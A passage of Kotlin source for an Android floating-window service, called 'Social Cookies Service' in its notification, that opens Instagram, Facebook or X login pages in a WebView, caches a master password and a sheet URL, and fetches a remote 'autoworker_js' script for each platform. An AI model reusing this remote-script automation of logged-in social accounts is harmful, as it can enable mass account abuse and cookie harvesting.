            intent.getStringExtra(EXTRA_MASTER_PASSWORD)?.let { if (it.isNotEmpty()) cachedMasterPassword = it }
            intent.getStringExtra(EXTRA_SHEET_URL)?.let { if (it.isNotEmpty()) cachedSheetUrl = it }
            intent.getStringExtra(EXTRA_USER_AGENT)?.let {
                if (it.isNotEmpty()) {
                    cachedUserAgent = it
                    if (::webView.isInitialized && !isDesktopMode) {
                        webView.settings.userAgentString = it
                    }
                }
            }

            if (intent.action == ACTION_UPDATE_SETTINGS) {
                Toast.makeText(this, "Settings synced to window (${getDataDirectorySuffix()})", Toast.LENGTH_SHORT)
                    .show()
                return START_NOT_STICKY
            }
        }

        updatePlatform(intent?.getStringExtra(EXTRA_PLATFORM) ?: intent?.getStringExtra("PLATFORM") ?: "instagram")
        createNotificationChannel()
        val notification = NotificationCompat.Builder(this, "floating_service_channel")
            .setContentTitle("Social Cookies Service")
            .setContentText("Window ${getDataDirectorySuffix()} is active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
        startForeground(getNotificationId(), notification)
        return START_NOT_STICKY
    }

    @SuppressLint("SetTextI18n")
    private fun updatePlatform(platform: String) {
        val p = platform.lowercase()
        currentPlatform = p

        // Prefetch or refresh remote script in background whenever platform changes
        serviceScope.launch(Dispatchers.IO) {
            try {
                BackendApiManager.fetchRemoteScript(this@FloatingService, "autoworker_js", currentPlatform)
            } catch (e: Exception) {
                // Ignore network errors; fallback/cached script will be used
            }
        }

        currentUrl = when (p) {
            "instagram" -> "https://www.instagram.com/accounts/login/"
            "facebook" -> "https://m.facebook.com/"
            "test_ua" -> "https://www.whatismybrowser.com/detect/what-is-my-user-agent"
            "twitter", "x" -> "https://x.com/i/flow/login"
            else -> "https://devdaymond.com"
        }
        val suffix = getDataDirectorySuffix()
        titleText.text = when (p) {
            "instagram" -> "IG ($suffix)"
            "facebook" -> "FB ($suffix)"
            "test_ua" -> "UA Test"
            "twitter", "x" -> "X ($suffix)"
            else -> "Dev Daymond"
        }
        if (::webView.isInitialized) webView.loadUrl(currentUrl)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "floating_service_channel",
                "Floating Service Channel",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
        try {
            unregisterReceiver(settingsReceiver)
        } catch (e: Exception) {
            e.printStackTrace()
        }
        if (::floatingView.isInitialized) {
            try {
                windowManager.removeView(floatingView)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        if (::webView.isInitialized) {
            try {
                (webView.parent as? ViewGroup)?.removeView(webView)
                webView.removeJavascriptInterface("AndroidDebug")
                webView.webChromeClient = WebChromeClient()
                webView.webViewClient = WebViewClient()
                webView.stopLoading()
                webView.loadUrl("about:blank")
                webView.onPause()
                webView.clearHistory()
                webView.removeAllViews()
                webView.destroy()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun Int.toPx(): Int = (this * resources.displayMetrics.density).toInt()
}
